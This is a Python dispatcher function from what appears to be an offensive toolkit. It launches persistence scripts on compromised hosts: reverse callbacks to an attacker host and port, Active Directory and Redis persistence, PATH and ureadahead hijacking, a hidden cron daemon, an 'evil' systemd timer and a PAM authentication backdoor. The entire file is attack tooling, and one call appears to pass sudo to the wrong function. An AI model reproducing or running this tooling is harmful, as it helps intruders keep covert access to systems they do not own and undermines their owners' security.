def cmd_persist(args):
    sub = args.persist_cmd

    if sub == "linux":
        extra = [args.lhost] if args.lhost else []
        extra += [str(args.lport)] if args.lport else []
        run(script("persist/linux_persist.sh", args.ip, args.user, args.passwd, *extra))

    elif sub == "ad":
        extra = [args.lhost] if args.lhost else []
        run(script("persist/ad_persist.sh", args.dc_ip, args.domain, args.admin, args.passwd, *extra))

    elif sub == "redis":
        extras = []
        for v in [args.port, args.redis_pass, args.lhost, args.lport]:
            if v is not None:
                extras.append(str(v))
            else:
                break
        run(script("persist/redis_persist.sh", args.ip, *extras))

    elif sub == "ureadahead":
        cmd = script("ureadahead-persist.sh", args.action)
        if args.action == "install" and args.key:
            cmd += ["--key", args.key]
        run(cmd, sudo=(args.action == "install"))

    elif sub == "shadow-cron":
        run(script("shadow-crond.sh", args.action, sudo=True))

    elif sub == "vim":
        run(script("vim-persist.sh"))

    elif sub == "path-hijack":
        cmd = script("path-hijack.sh", args.action)
        if args.level:
            cmd += ["--level", args.level]
        if args.payload:
            cmd += ["--payload", str(args.payload)]
        if args.key:
            cmd += ["--key", args.key]
        run(cmd)

    elif sub == "evil-timer":
        run(script("evil-timer/deploy-evil-timer.sh", args.action))

    elif sub == "pam":
        run(script("pam-backdoor/deploy-pam-backdoor.sh", args.action, sudo=True))

